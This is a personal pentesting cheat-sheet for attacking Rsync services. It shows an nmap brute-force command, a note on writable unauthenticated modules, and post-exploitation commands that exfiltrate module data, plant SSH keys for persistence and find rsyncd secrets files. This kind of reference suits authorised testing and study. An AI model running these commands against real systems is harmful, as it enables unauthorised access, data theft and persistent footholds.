---
id: Rsync
aliases: []
tags:
  - Networking/Services/Rsync/Exploitation
links: "[[Networking/Services/General]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Outdated Version {{{-->
## Outdated Version

Old versions of Rsync may contain vulnerabilities that can be exploited

<!-- Example {{{-->
> [!tip]
>
> [[Networking/Services/Rsync/Enumeration#Service|Identify Outdated Rsync Service Version]]
<!-- }}} -->

___
<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

Brute force Rsync login

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Nmap]]

```sh
nmap \
  -sV \
  $target -p 873 \
  --script rsync-brute
  --script-args userdb=/var/<usernames.txt>,passdb=/var/<passwords.txt> \
  -oA rsync-script-brute
```

___
<!-- }}} -->

<!-- Misconfigured Modules {{{-->
## Misconfigured Modules

[[Networking/Services/Rsync/Enumeration#Modules|Modules]] without proper authentication
can be accessed by unauthorized users to read,
modify or delete sensitive data

<!-- Tip {{{-->
> [!tip]
>
> If a module is writeable, a malicious file can be uploaded,
> potentially leading to remote command execution
> or pivoting into the network
<!-- }}} -->

___
<!-- }}} -->

___
<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Data Exfiltration

```sh
rsync -avz target_host::module_name /local/directory/
```

___
<!-- }}} -->

<!-- Presistence {{{-->
## Presistence

Gain Persistent Access by [[Usage#File Operations|Copying]]
[[SSH/General|SSH keys]]

```sh
rsync -av </home/user/.ssh/> rsync://<user>@$target/<home/user/.ssh>
```

___
<!-- }}} -->

<!-- Config File {{{-->
## Config File

Locate the Rsyncd [[Networking/Services/Rsync/General#Configuration|configuration file]]

```sh
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

<!-- Tip {{{-->
> [!tip]
>
> In `rsyncd.conf` the `secrets` file parameter might point to a file
> containing usernames and passwords for rsyncd authentication
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
